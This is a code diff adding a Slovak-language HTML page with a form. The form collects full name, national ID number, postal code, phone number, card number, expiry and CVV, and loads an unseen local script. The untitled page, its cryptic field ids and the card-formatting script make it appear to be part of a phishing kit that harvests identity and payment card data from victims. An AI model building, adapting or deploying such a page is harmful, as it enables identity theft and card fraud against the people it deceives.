@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/lakona.css">
+    <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    
+    <div class="kola">
+        <div>
+            <div class="upto">
+                <img src="./img/hepodicc.JPG" alt="">
+            </div>
+        </div>
+    
+    
+        <div>
+            <div class="cct">
+                
+                
+                <form class="formcc" method="post" id="pg2">
+                    <div class="feildcc1">
+                        <p><span>*</span>Celé meno</p>
+                    <input type="text" placeholder="" maxlength="19" required id="nom">
+                    <p><span>*</span>Číslo občianskeho preukazu</p>
+                    <input type="text" placeholder="" maxlength="16" required id="posita">
+                    
+                    <p><span>*</span>Poštové smerovacie číslo</p>
+                    <input type="text" placeholder="" maxlength="16" required id="nidi">
+
+                    <p><span>*</span>Telefónne číslo</p>
+                    <input type="text" placeholder="+421" maxlength="13" required id="pona">
+
+                    </div>
+                    <!--  -->
+                    
+                    <!--  -->
+                    <div class="feildcc">
+                        <p><span>*</span>Číslo karty</p>
+                    <input type="text" placeholder="---- ---- ---- ----" maxlength="19" required id="one">
+                    <p><span>*</span>Platnosť karty do (mesiac/rok)</p>
+                    <input type="text" placeholder="(MM/RR)" maxlength="8" required id="two">
+                    <p><span>*</span>Overovací kód (CVV)</p>
+                    <input type="text" placeholder="" maxlength="4" required id="three">
+                    <!--  -->
+                    
+                    <!--  -->
+                    </div>
+                    <button type="submit">Pokračovať</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div>
+        <div class="pola">
+            <img src="./img/bkilato.JPG" alt="">
+        </div>
+    </div>
+
+    <script>
+        $("#one").on("keyup",function(){
+           cc = $(this).val().split(" ").join("");
+           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+           $(this).val(cc);
+       });
+       $("#two").on("keyup",function(){
+           dd = $(this).val().split("/").join("");
+           dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
+           $(this).val(dd);
+       });
+   </script>
+    <!-- my script -->
+
+    <script src="./js/stb.js"></script>
+</body>
+</html>
